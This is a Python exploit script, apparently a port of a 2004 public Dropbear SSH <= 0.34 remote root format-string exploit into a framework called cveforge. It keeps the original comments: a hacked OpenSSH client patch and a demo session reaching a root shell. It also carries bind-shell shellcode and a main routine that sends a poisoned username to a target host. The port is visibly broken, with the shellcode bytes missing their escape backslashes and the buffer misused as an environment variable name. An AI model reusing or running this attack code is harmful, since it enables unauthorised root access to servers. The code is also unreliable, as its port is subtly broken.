# Linux x86 Dropbear SSH <= 0.34 remote root exploit
# coded by live
#
# You'll need a hacked ssh client to try this out. I included a patch
# to openssh-3.6.p1 somewhere below this comment.
#
# The point is: the buffer being exploited is too small(25 bytes) to hold our
# shellcode, so a workaround was needed in order to send it. What I did here
# was to hack the ssh client so that it sends the local   environment variable
# SHELLCODE as ssh's methodname string.   This method   was described by Joel
# Eriksson @ 0xbadc0ded.org.
#
# The 25 bytes limitation is also the reason for the the strange ``2 byte''
# retaddr you will see here. That's not enough for complete pointer overwrite,
# so I decided to   overwrite 3rd and 2nd   bytes and hope our   shellcode is
# around ;)
#
# % telnet localhost 22
# Trying 127.0.0.1...
# Connected to localhost.
# Escape character is '^]'.
# SSH-2.0-dropbear_0.34
# ^]
# telnet> quit
# Connection closed.
#
# % objdump -R /usr/local/sbin/dropbear| grep malloc
# 080673bc R_386_JUMP_SLOT   malloc
#
# % drop-root -v24 localhost
# ?.2022u%24$hn@localhost's password:
# Connection closed by 127.0.0.1
#
# % telnet localhost 10275
# Trying 127.0.0.1...
# Connected to localhost.
# Escape character is '^]'.
# id; exit;
# uid=0(root) gid=0(root) groups=0(root)
# Connection closed by foreign host.
#
# In the above example we were able to lookup a suitable .got entry(used as
# retloc here), but this may not be true under a hostile environment. If
# exploiting this remotely I feel like chances would be greater if we attack
# the stack, but that's just a guess.
#
# Version pad is 24 to 0.34, 12 to 0.32. I don't know about other versions.
#
# gr33tz: ppro, alcaloide and friends.
#
# 21.08.2003
# Please do not distribute


# --- sshconnect2.c2003-08-21 21:34:03.000000000 -0300
# +++ sshconnect2.c.hack2003-08-21 21:33:47.000000000 -0300
# @@ -278,6 +278,8 @@
# void
# userauth(Authctxt *authctxt, char *authlist)
# {
# +     char *shellcode = getenv("SHELLCODE");
# +
# if (authlist == NULL) {
# authlist = authctxt->authlist;
# } else {
# @@ -290,6 +292,7 @@
# if (method == NULL)
# fatal("Permission denied (%s).", authlist);
# authctxt->method = method;
# +         authctxt->method->name = shellcode;
# if (method->userauth(authctxt) != 0) {
# debug2("we sent a %s packet, wait for reply", method->name);
# break;

from datetime import datetime
import os
import paramiko
import typer
from cveforge.core.commands.run import tcve_exploit
from cveforge.core.context import Context

SSH_PATH = "ssh"
SSH_PORT = 22

DEFAULT_RETLOC = 0xBFFFF800
DEFAULT_RETADDR = 0x080E

# 2 byte retaddr, not enough space for a full overwrite.


# fork/bind shellcode by live
# default port is 10275
#
# I believe this can be futher optmized, but size is not
# an issue here since we are sending the shellcode through
# a ssh variable which is about 30k bytes long.

shellcode = (
    b"x31xc0"  # xor     %eax,%eax
    b"xb0x02"  # mov     $0x2,%al
    b"xcdx80"  # int     $0x80
    b"x85xc0"  # test   %eax,%eax
    b"x75x54"  # jne     5e
    b"xebx50"  # jmp     5c
    b"x5e"  # pop     %esi
    b"x31xc0"  # xor     %eax,%eax
    b"x31xdb"  # xor     %ebx,%ebx
    b"x89x46x08"  # mov     %eax,0x8(%esi)
    b"xb0x02"  # mov     $0x2,%al
    b"x89x06"  # mov     %eax,(%esi)
    b"xfexc8"  # dec     %al
    b"x89x46x04"  # mov     %eax,0x4(%esi)
    b"xb0x66"  # mov     $0x66,%al
    b"xfexc3"  # inc     %bl
    b"x89xf1"  # mov     %esi,%ecx
    b"xcdx80"  # int     $0x80
    b"x89x06"  # mov     %eax,(%esi)
    b"x89x4ex04"  # mov     %ecx,0x4(%esi)
    b"x80x46x04x0c"  # addb   $0xc,0x4(%esi)
    b"x31xc0"  # xor     %eax,%eax
    b"xb0x10"  # mov     $0x10,%al
    b"x89x46x08"  # mov     %eax,0x8(%esi)
    b"xb0x02"  # mov     $0x2,%al
    b"x66x89x46x0c"  # mov     %ax,0xc(%esi)
    b"x66xb8x28x23"  # mov     $0x2328,%ax
    b"x89x46x0e"  # mov     %eax,0xe(%esi)
    b"x31xc0"  # xor     %eax,%eax
    b"x89x46x10"  # mov     %eax,0x10(%esi)
    b"xb0x66"  # mov     $0x66,%al
    b"xfexc3"  # inc     %bl
    b"xcdx80"  # int     $0x80
    b"xfexcb"  # dec     %bl
    b"x89x5ex04"  # mov     %ebx,0x4(%esi)
    b"x31xc0"  # xor     %eax,%eax
    b"xb0x66"  # mov     $0x66,%al
    b"xb3x04"  # mov     $0x4,%bl
    b"xcdx80"  # int     $0x80
    b"xebx04"  # jmp     60
    b"xebx44"  # jmp     a2
    b"xebx3a"  # jmp     9a
    b"x31xc0"  # xor     %eax,%eax
    b"x89x46x04"  # mov     %eax,0x4(%esi)
    b"x89x46x08"  # mov     %eax,0x8(%esi)
    b"xb0x66"  # mov     $0x66,%al
    b"xfexc3"  # inc     %bl
    b"xcdx80"  # int     $0x80
    b"x31xc9"  # xor     %ecx,%ecx
    b"x89xc3"  # mov     %eax,%ebx
    b"x31xc0"  # xor     %eax,%eax
    b"xb0x3f"  # mov     $0x3f,%al
    b"xcdx80"  # int     $0x80
    b"xfexc1"  # inc     %cl
    b"x80xf9x03"  # cmp     $0x3,%cl
    b"x75xf3"  # jne     72
    b"x68x2fx2fx73x68"  # push   $0x68732f2f
    b"x68x2fx62x69x6e"  # push   $0x6e69622f
    b"x89xe3"  # mov     %esp,%ebx
    b"x31xc0"  # xor     %eax,%eax
    b"x88x43x08"  # mov     %al,0x8(%ebx)
    b"x50"  # push   %eax
    b"x53"  # push   %ebx
    b"x89xe1"  # mov     %esp,%ecx
    b"x89xe2"  # mov     %esp,%edx
    b"xb0x0b"  # mov     $0xb,%al
    b"xcdx80"  # int     $0x80
    b"x31xc0"  # xor     %eax,%eax
    b"x31xdb"  # xor     %ebx,%ebx
    b"xfexc0"  # inc     %al
    b"xcdx80"  # int     $0x80
    b"xe8x65xffxffxff"  # call   c <up>
)


@tcve_exploit(
    name="airos",
    related_ports=[22],
    related_softwares=["Dropbear sshd (protocol 2.0)"],
    date=datetime(2004, 8, 9),
    categories=["ubiquiti", "nanostation", "dropbear", "ssh", "sshd"],
)
def main(
    target: str = typer.Option(),
    port: int = typer.Option(default=22),
    off_location_bits: int = typer.Option(),
    off_addr_bits: int = typer.Option(),
    version_pad: int = typer.Option(default=24),
):
    context: Context = Context()
    poisoned_username = b""
    buffer = bytearray([0x90 for _ in range(29500)])

    retloc: int = DEFAULT_RETLOC + 1 + off_location_bits * 4
    retaddr: int = DEFAULT_RETADDR - 40 + off_addr_bits * 4

    buffer[-len(shellcode) :] = shellcode
    buffer[:10] = b"SHELLCODE="

    os.environ.setdefault(buffer.decode(), "")

    poisoned_username = b"%c%c%c%c%%.%du%%%d$hn" % (
        (retloc & 0xFF),
        (retloc & 0xFF00) >> 8,
        (retloc & 0xFF0000) >> 16,
        (retloc & 0xFF000000) >> 24,
        retaddr,
        version_pad,
    )
    client = paramiko.SSHClient()
    client.connect(
        username=poisoned_username.decode(),
        port=port,
        hostname=target,
    )
    context.stdout.print(client.exec_command("whoami"))


# Original author: milw0rm.com [2004-08-09]
# reference: https://www.exploit-db.com/exploits/387
